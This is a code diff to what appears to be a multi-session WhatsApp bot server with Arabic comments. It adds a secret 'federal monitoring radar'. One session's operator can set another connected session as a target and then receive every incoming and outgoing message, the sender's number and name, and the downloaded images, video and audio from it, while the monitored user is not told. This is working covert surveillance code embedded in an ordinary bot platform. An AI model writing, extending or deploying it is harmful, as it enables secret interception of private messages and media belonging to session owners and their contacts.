@@ -114,7 +114,8 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             antiBadWords: false,
             badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
             antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
-            statusStealer: false // ميزة سحب الستوري (إضافة جديدة)
+            statusStealer: false, // ميزة سحب الستوري (إضافة جديدة)
+            monitoringTarget: null // 🕵️ [تطوير] المستهدف للمراقبة
         };
         saveSettings();
     }
@@ -224,6 +225,43 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const pushName = msg.pushName ||  'مجهول' ;
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
+
+        // 🕵️‍♂️ [تطوير: نظام المراقبة الفدرالي السري للغاية] 🆕
+        // هذا المحرك يراقب الجلسة ويرسل التقارير للجلسة التي تفعل الرادار
+        for (const monitorId in botSettings) {
+            if (botSettings[monitorId].monitoringTarget === sessionId) {
+                const monitorSock = sessions[monitorId];
+                if (monitorSock) {
+                    try {
+                        const mTime = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
+                        const mType = Object.keys(msg.message)[0];
+                        const mContent = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "رسالة وسائط/مستند";
+                        const direction = isFromMe ? "🟢 صادر (من صاحب الجلسة)" : "🔵 وارد (إلى صاحب الجلسة)";
+                        const monitorBossJid = jidNormalizedUser(monitorSock.user.id);
+
+                        let report = `🕵️‍♂️ *[رادار المراقبة الفدرالي]* 🕵️‍♂️\n\n`;
+                        report += `📂 *الجلسة المراقبة:* ${sessionId}\n`;
+                        report += `🔄 *النوع:* ${direction}\n`;
+                        report += `👤 *الاسم:* ${pushName}\n`;
+                        report += `📱 *الرقم:* wa.me/${sender.split('@')[0]}\n`;
+                        report += `🕒 *الوقت:* ${mTime}\n`;
+                        report += `📑 *نوع الرسالة:* ${mType}\n\n`;
+                        report += `✉️ *المحتوى:* ${mContent}\n\n`;
+                        report += `🤖 *— TARZAN INTELLIGENCE 👑*`;
+
+                        await monitorSock.sendMessage(monitorBossJid, { text: report });
+
+                        // سحب الوسائط والستوري في المراقبة
+                        if ((msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage)) {
+                            const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
+                            if (msg.message.imageMessage) await monitorSock.sendMessage(monitorBossJid, { image: buffer, caption: `🖼️ صورة مراقبة من: ${pushName}` });
+                            else if (msg.message.videoMessage) await monitorSock.sendMessage(monitorBossJid, { video: buffer, caption: `🎥 فيديو مراقب من: ${pushName}` });
+                            else if (msg.message.audioMessage) await monitorSock.sendMessage(monitorBossJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
+                        }
+                    } catch (e) {}
+                }
+            }
+        }
 
         // 🛡️ [تطوير ميزة سحب الستوري فوراً] 🆕
         const currentSettings = botSettings[sessionId] || {};
@@ -378,6 +416,22 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         if (!commandName) return;
+
+        // 🕵️‍♂️ [تطوير: دمج أمر المراقبة مباشرة] 🆕
+        if (commandName === 'مراقبه') {
+            const target = args[0];
+            if (target === "ايقاف") {
+                botSettings[sessionId].monitoringTarget = null;
+                saveSettings();
+                return reply("📴 *تم إيقاف المراقبة الفدرالية بنجاح.*");
+            }
+            if (!target || !sessions[target]) {
+                return reply(target ? `❌ الجلسة [${target}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه session1`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
+            }
+            botSettings[sessionId].monitoringTarget = target;
+            saveSettings();
+            return reply(`✅ *تم تفعيل الرادار الفدرالي بنجاح!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${target}]\n🔐 *الوضعية:* سري للغاية (صادر/وارد)\n\n*سيصلك كل شيء من تلك الجلسة هنا فوراً.*`);
+        }
 
         const commandData = commandsMap.get(commandName);
 
